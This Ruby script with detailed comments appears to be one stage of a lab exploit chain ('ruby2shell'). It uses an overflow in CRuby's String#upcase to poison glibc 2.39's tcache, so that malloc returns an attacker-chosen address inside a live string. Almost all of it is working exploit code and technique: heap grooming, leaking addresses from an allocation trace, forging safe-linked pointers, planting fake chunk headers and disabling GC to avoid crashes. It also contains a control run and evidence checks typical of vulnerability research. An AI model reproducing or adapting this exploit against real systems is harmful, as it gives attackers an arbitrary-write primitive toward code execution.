# Stage C — tcache poisoning from the Stage B overlap: the second
# same-class allocation returns an attacker-nominated address.
#
# Stage B proved chosen bytes over a live chunk (W). Stage C replaces
# the live W with a pair of TCACHE-MEMBER chunks after V:
#   [S 0x370][V 0x430][T 0x3f0 in tcache][A 0x3f0 in tcache][dummy]
# T carries the same fake next-chunk header at its user offsets
# 0x10..0x1f that W's live content carried, so the inflated-V unsorted
# walk (0x431 -> 0x453) is answered identically. But T is IN
# tcache[0x3f0] when the marker lands: the exact-fit marker request
# (1081 -> chunk 0x450) returns V, Ruby fills it with 'm'×1080, and
# the LAST 8 marker bytes (offsets 1072..1079 = V+0x430..V+0x437)
# land exactly on T's safe-linked tcache `next` field. We splice our
# own 8 bytes there: target ^ (T_entry >> 12) (glibc 2.39
# PROTECT_PTR, lab/src/glibc-2.39-malloc.c:329-331; tcache_get has no
# pointer validation beyond 16-alignment, :3174-3199).
#
# Two follow-up "z"*1000 requests then pop tcache[0x3f0]:
#   pop1 -> T (count 2 -> 1), entries = forged target;
#   pop2 -> target = f_host's buffer + 0x100, INSIDE a live string.
# Ruby writes 'z'×1000 there; reading f_host back shows chosen bytes
# at the chosen offset — and the mtrace line "M 3e9 <target>" proves
# malloc returned the forged pointer.
#
# Consumer reality, observed (gdb backtrace, evidence stageC-dbg):
# CRuby's objspace_malloc_fixup calls malloc_usable_size on EVERY
# xmalloc return (gc/default/default.c:8100 -> :7947) — a poisoned pop
# whose returned chunk has a clobbered header dies inside the
# allocation call, before attacker code resumes. Both popped chunks
# therefore need musable-safe headers:
#   - T's real header (clobbered 'm' by the marker fill) is RESTORED
#     through the same overlap (marker offsets 1056..1071 =
#     V+0x420..V+0x42f) to its honest 0x3f0|PREV_INUSE;
#   - the forged target's fake chunk header is pre-planted in
#     f_host's own content (fake size 0x3f1 at target-0x8, fake
#     "next chunk" size word at f+0x4e8 answering musable's inuse
#     check). Attacker-controlled string content, nothing more.
#
# In-process address discovery: mtrace.so writes every malloc line
# to fd 2 with raw write(2) (unbuffered). The runner redirects fd 2 to
# the trace file and passes STAGEC_TRACE=<path>; this script reads
# the trace file mid-run and parses V's and f_host's addresses from
# the ===ALLOC=== segment. ASLR therefore never matters: the forged
# value is computed in the same run that uses it.
#
# Sweep order (observed in stageB evidence: descending address, so
# reverse allocation order): dummy, A, T, V, S. T is freed BEFORE V
# (V's free would otherwise backward-consolidate the cleared-inuse
# T), A is freed before T, so T sits at the bin head. t_content is
# never dropped (stays referenced to exit), so the bin holds exactly
# [A, T], count 2.
#
# Geometry classes (string.c: request = len + 1; chunk = (len+9)&~15):
#   S    "d"*856  -> 0x370   tcache-popped by upcase buffer1
#   V    "v"*1048 -> 0x430   > tcache max 0x410 -> unsorted
#   T    len 1000 -> 0x3f0   tcache member (<= 0x410)
#   A    "q"*1000 -> 0x3f0   tcache member (count guard)
#   dummy "e"*840 -> 0x360   tcache-popped by upcase buffer2
#   f    "F"*4000 -> 0xfb0   the arbitrary-write target's host
# T content: "W"*16 + fake prev_size 0x450 + fake size 0x90
# (prev_inuse CLEAR) + "A"*968 — the fake header at T user
# 0x10..0x1f (== V+0x440, the inflated next chunk) and inuse-bit
# filler out to T user 0xa8, exactly where stageB's W answered the
# five walk checks.
#
# Control: STAGEC_CONTROL=1 runs pure ß×828 (no parity flip -> no
# overflow byte). Expectation: V binned at its real 0x430, the marker
# is served away from T (from the parse-IO chunk in the largebin or
# the top), T's fd stays the honest safe-link to A, pop2 returns A,
# f_host reads back its original 'F' bytes everywhere, full teardown
# GC runs clean. Any 'z' inside f_host in control falsifies the
# attribution.
#
# Run (traced, via lab/repro/ruby2shell-stageC.sh):
#   MTRACE_FD=2 LD_PRELOAD=$PWD/lab/preload/mtrace.so \
#     STAGEC_TRACE=$PWD/lab/build/evidence/stageC-1.trace \
#     lab/build/plain/ruby-3.4.12-plain/bin/ruby \
#     lab/repro/ruby2shell-stageC.rb 2>...stageC-1.trace
def marker(s)
  STDERR.write(s); STDERR.flush
end

trace_path = ENV["STAGEC_TRACE"]
raise "STAGEC_TRACE not set" unless trace_path

marker("===SETTLE===\n")
GC.start

# Drain every involved chunk class (512 live strings each exhausts all
# recycled tcache/smallbin holes observed in practice).
drain360 = Array.new(512) { "e" * 840 }   # request 841  -> 0x360
drain370 = Array.new(512) { "d" * 856 }   # request 857  -> 0x370
drain3f0 = Array.new(512) { "t" * 1000 }  # request 1001 -> 0x3f0
drain430 = Array.new(512) { "v" * 1048 }  # request 1049 -> 0x430
drain460 = Array.new(512) { "w" * 1096 }  # request 1097 -> 0x460 (stageB parity)

# T content: filler, then the fake next-chunk header, then filler.
# T's free to tcache clobbers only user offsets 0..0xf (fd+key) —
# the "W"*16 filler; the fake header at 0x10..0x1f survives intact.
t_content = ("W" * 16) +
            "\x50\x04\x00\x00\x00\x00\x00\x00" +  # fake prev_size = 0x450
            "\x90\x00\x00\x00\x00\x00\x00\x00" +  # fake size 0x90, prev_inuse CLEAR
            ("A" * 968)                            # answers the walk's further checks
raise "t_content len #{t_content.bytesize}" unless t_content.bytesize == 1000

marker("===ALLOC===\n")
s_chunk = "d" * 856            # S  0x370, tcache later
v_chunk = "v" * 1048           # V  0x430, unsorted later
t_live   = t_content + ""      # T  0x3f0, tcache later (adjacent to V;
                               # the `+ ""` forces a fresh malloc — #dup is COW)
a_chunk  = "q" * 1000          # A  0x3f0, tcache first (count guard)
dummy    = "e" * 840           # 0x360, tcache later (buffer2 stock)
f_host   = ("F" * 0xf0) +                     # readback anchor, untouched zone
            [0, 0x3f1].pack("Q<Q<") +         # fake chunk header at f+0xf0:
                                              # prev_size 0, size 0x3f1
            ("F" * 0x3e8) +                   # the target region f+0x100..
            [0x3f1].pack("Q<") +              # fake NEXT chunk's size at
                                              # f+0x4e8 — musable's inuse
                                              # check reads exactly here
            ("F" * (4000 - 0x4f0))             # len 4000 -> request 0xfa1
raise "f_host len #{f_host.bytesize}" unless f_host.bytesize == 4000

# Parse the trace this process is writing: V's malloc line is the
# first request-0x419 after ===ALLOC===, f_host's the only 0xfa1.
v_addr = nil
f_addr = nil
in_alloc = false
File.foreach(trace_path) do |line|
  in_alloc = true if line.include?("===ALLOC===")
  next unless in_alloc
  if line =~ /\AM \d+ 419 ([0-9a-f]+)/ && v_addr.nil?
    v_addr = $1.to_i(16)
  elsif line =~ /\AM \d+ fa1 ([0-9a-f]+)/ && f_addr.nil?
    f_addr = $1.to_i(16)
  end
  break if v_addr && f_addr
end
raise "trace parse failed v=#{v_addr} f=#{f_addr}" unless v_addr && f_addr

t_entry = v_addr + 0x430       # T's tcache entry address (== T user ptr)
target   = f_addr + 0x100      # 16-aligned address inside f_host's buffer
forged   = [target ^ (t_entry >> 12)].pack("Q<")  # glibc PROTECT_PTR

STDOUT.write("V-addr=0x#{v_addr.to_s(16)}\n")
STDOUT.write("T-entry=0x#{t_entry.to_s(16)}\n")
STDOUT.write("target=0x#{target.to_s(16)}\n")
STDOUT.flush

if ENV["STAGEC_CONTROL"]
  src = ("\xDF".b * 828)      # no 'a': pairs land at even offsets only,
                              # to reaches 848 exactly -> NO overflow
else
  src = ("a".b + "\xDF".b * 827)
end
src.force_encoding(Encoding::ISO_8859_1)
raise "src len #{src.bytesize}" unless src.bytesize == 828

marker("===FREE===\n")
v_chunk = nil; s_chunk = nil; dummy = nil; a_chunk = nil; t_live = nil
GC.start  # descending-address sweep: dummy -> tcache[0x360];
          # A -> tcache[0x3f0] (count 1); T -> tcache[0x3f0] (count 2,
          # HEAD, T.next = safe-link to A); V -> unsorted (its forward
          # neighbor T is a tcache member, appears in-use); S -> tcache[0x370].

GC.disable  # T's chunk header is about to become 'm'-clobbered; an
            # auto-GC sweep between the pops would call
            # objspace_malloc_size(T's buffer) -> malloc_usable_size ->
            # SEGV on the 'm' sizefield (the stageB ABORT fingerprint,
            # observed in the first stageC run: crash inside z2's
            # rb_str_times, RDX=0x6d6d6d6d6d6d6d68, before pop2's
            # malloc even ran). The remaining script is a handful of
            # allocations; no GC is needed until the readback is done.
            # Honest lab condition, same class as stageB's
            # single-threaded in-process scope. Control re-enables
            # before its teardown.
marker("===UPCASE===\n")
t = src.upcase  # buffer1 pops S: one 0x53 onto V's size LSB;
                # buffer2 pops dummy; result malloc(1656) walks unsorted
                # and bins V at its inflated 0x450.
raise "upcase len #{t.bytesize}" unless
  t.bytesize == (ENV["STAGEC_CONTROL"] ? 2 * 828 : 2 * 828 - 1)

marker("===MARK===\n")
ov = "m" * 1080  # malloc(1081): chunk 0x450 exact fit -> V, overlapping
                 # T's chunk header (V+0x420) and T's user bytes 0..8.
ov.force_encoding(Encoding::ASCII_8BIT)
ov[1072, 8] = forged  # splice the forged PROTECT_PTR value over T's
                      # tcache `next` field (V+0x430..V+0x437).
ov[1056, 16] = [0x450, 0x3f1].pack("Q<Q<")
               # RESTORE T's chunk header (V+0x420..V+0x42f, marker
               # offsets 0x420=1056..1071) to its honest 0x3f0|PREV_INUSE
               # class. Required: CRuby's objspace_malloc_fixup calls
               # malloc_usable_size on EVERY xmalloc return
               # (gc/default/default.c:8100 -> :7947, verified by gdb
               # backtrace in evidence stageC-dbg) — an unrepaired 'm'
               # header makes pop1 die inside the allocation call
               # (musable dereferences T_c+0x6d6d6d6d6d6d6d68).
               # The forged target survives the same check via the
               # fake chunk header pre-planted in f_host's content.

marker("===POPS===\n")
STDOUT.write("forged-hex=#{forged.unpack1('H*')}\n")
STDOUT.write("ov-t-hdr-and-next=#{ov.byteslice(1040, 40).unpack1('H*')}\n")
STDOUT.write("f-host-before=#{f_host.byteslice(0x100, 8).unpack1('H*')}\n")
STDOUT.flush
z1 = "z" * 1000  # malloc(1001): tcache pop -> T, entries := forged target
z2 = "z" * 1000  # malloc(1001): tcache pop -> the forged target itself,
                 # inside f_host's live buffer; Ruby writes 'z'×1000 there.

f_hit  = f_host.byteslice(0x100, 8)
f_pre  = f_host.byteslice(0, 8)      # untouched anchor: offset 0 stays 'F'
f_size = f_host.byteslice(0xf8, 8)   # the planted fake size field
f_tail = f_host.byteslice(0x4e8, 8)  # fake next-size field (its first byte
                                     # becomes z2's NUL terminator on hit)
attack = !ENV["STAGEC_CONTROL"]
STDOUT.write("F-readback-hex=#{f_host.byteslice(0x100, 16).unpack1('H*')}\n")
STDOUT.write("fake-size-hex=#{f_size.unpack1('H*')}\n")
STDOUT.write("f-tail-hex=#{f_tail.unpack1('H*')}\n")
expected_hit = attack ? "z" * 8 : "F" * 8
expected_size = "\xf1\x03".b + ("\x00" * 6)  # 0x3f1 little-endian
verdict =
  if f_hit == expected_hit && f_pre == "F" * 8 &&
     (f_size == expected_size)
    attack ? "poisoned" : "clean"
  else
    "UNEXPECTED"
  end
STDOUT.write("verdict=#{verdict}\n")
STDOUT.flush

if attack
  # Bins after the pops: tcache[0x3f0] head is garbage read from
  # f_host bytes (count 0, never popped), and z2's "chunk" is a fake
  # inside f_host — no honest teardown exists. The evidence is the
  # readback plus the mtrace "M 3e9 <target>" pop line; skip teardown.
else
  # Control: every bin is honest — run the full teardown GC.
  z1 = nil; z2 = nil; ov = nil; f_host = nil
  GC.enable  # GC was disabled for the pops; re-enable for the sweep.
  GC.start
  puts "NO-ABORT"
end
